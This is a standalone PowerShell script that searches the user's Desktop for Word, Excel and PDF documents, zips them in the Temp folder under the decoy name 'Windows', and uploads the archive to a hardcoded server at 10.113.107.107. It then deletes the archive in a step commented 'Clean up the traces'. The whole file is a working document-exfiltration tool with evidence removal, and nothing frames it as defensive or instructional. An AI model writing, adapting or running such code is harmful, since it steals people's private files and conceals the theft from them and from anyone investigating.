 function Scan-Files {
    param (
        [string]$Path,
        [string[]]$Extensions
    )

    # Validate path
    if (!(Test-Path $Path)) {
        Write-Host "Error: $Path does not exist" -ForegroundColor Red
        return $null
    }

    # Scan files based on extensions
    $files = Get-ChildItem -Path $Path -Recurse -File -Include $Extensions
    if ($files.Count -eq 0) {
        Write-Host "Warning: No file match" -ForegroundColor Yellow
        return $null
    }
    else {
        foreach ($file in $files) { 
        Write-Host "Info: Found $file " -ForegroundColor Green
        }
    }

    return $files
}


function Create-Archive {
    param (
        [string]$destinationPath,
        [string]$fileName,
        [Array[]]$files
    )

    # Validate path
    if (!(Test-Path $destinationPath)) {
        Write-Host "Error: Path does not exist" -ForegroundColor Red
        return $null
    }

    # Define the zip file path
    $zipFilePath = "$destinationPath\$fileName.zip"

    # Create a temporary folder to store files before zipping
    $tempFolderPath = Join-Path (Get-Location) -ChildPath "tempArchive"
    New-Item -ItemType Directory -Force -Path $tempFolderPath | Out-Null

    # Copy files to the temporary folder
    $filesToArchive | ForEach-Object {
        Copy-Item -Path $files.FullName -Destination $tempFolderPath
    }

    # Create the zip archive
    Compress-Archive -Path "$tempFolderPath\*" -Update -DestinationPath $zipFilePath

    # Clean up the temporary folder
    Remove-Item -Path $tempFolderPath -Recurse -Force

    Write-Host "Info: Archive created successfully at: $zipFilePath" -ForegroundColor Green
    return $zipFilePath
}

# Upload to http server
function Upload-File {
    param (
        [string]$FilePath,
        [string]$URL
    )

    # Validate path
    if (!(Test-Path $FilePath)) {
        Write-Host "Error: $FilePath does not exist" -ForegroundColor Red
        return
    }

    # Create multipart form-data boundary
    $Boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    # Read the file contents
    $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $FileBase64 = [System.Convert]::ToBase64String($FileBytes)
    $FileName = [System.IO.Path]::GetFileName($FilePath)

    # Build the multipart form-data body
    $Body = (
        "--$Boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"",
        "Content-Type: application/octet-stream$LF",
        [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($FileBytes),
        "--$Boundary--$LF"
    ) -join $LF

    # Headers
    $Headers = @{
        "Content-Type" = "multipart/form-data; boundary=$Boundary"
    }

    # Upload the file using Invoke-WebRequest
    try {
        $Response = Invoke-WebRequest -Uri $URL -Method Post -Headers $Headers -Body $Body
        Write-Host "Success: File uploaded successfully" -ForegroundColor Green
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    }

    # Clean up the traces
    try {
        Remove-Item -Path $FilePath -Force -ErrorAction Stop
        Write-Host "Info: $FilePath removed successfully." -ForegroundColor Green
    } catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}


# File Scanning
Write-Host "File Scanning....." -ForegroundColor Blue
# Add extention as per requirement
$fileExtensions = "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf"
$scanPath = [System.Environment]::GetFolderPath('Desktop')
$scannedFiles = Scan-Files -Path $scanPath -Extensions $fileExtensions

# File Archiving
Write-Host "File Archiving....." -ForegroundColor Blue
$destinationPath = [System.Environment]::GetFolderPath('Temp')
$zipFileName = "Windows"
$zipFilePath = Create-Archive -destinationPath $destinationPath -fileName $zipFileName -files $scannedFiles

# File Uploading
Write-Host "File Uploading....." -ForegroundColor Blue
$uploadServer = "http://10.113.107.107:7070/upload"
Upload-File -FilePath $zipFilePath -URL $uploadServer 
